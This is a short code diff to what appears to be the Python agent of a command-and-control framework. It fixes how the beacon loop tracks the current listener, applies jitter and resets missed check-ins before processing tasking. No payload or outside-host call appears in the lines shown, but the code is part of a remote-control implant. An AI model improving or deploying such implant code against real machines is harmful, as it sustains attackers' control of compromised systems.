@@ -91,6 +91,8 @@ def send_message(data = None):
     #to C2. Only increases missedcheckins once every one has been tried
     for listener in listeners:
 
+        curlistener = listener
+
         # sleep for the randomized interval
         if listener['jitter'] < 0: listener['jitter'] = -listener['jitter']
         if listener['jitter'] > 1: listener['jitter'] = 1/listener['jitter']
@@ -119,7 +121,6 @@ def send_message(data = None):
             if data == base64.b64decode(listener['defaultResponse']):
                 listener['missedCheckins'] = 0
             else:
-                curlistener = listener
                 decode_routing_packet(data)
 
             break           
@@ -254,9 +255,9 @@ def process_tasking(data):
             fh.write("got a packet")
             fh.write("curlistener missedcheckins")
 
-        # if we get to this point, we have a legit tasking so reset missedCheckins
 
-        listeners[curlistener][missedCheckins] = 0
+        # if we get to this point, we have a legit tasking so reset missedCheckins
+        curlistener['missedCheckins'] = 0
 
         # execute/process the packets and get any response
         resultPackets = ""
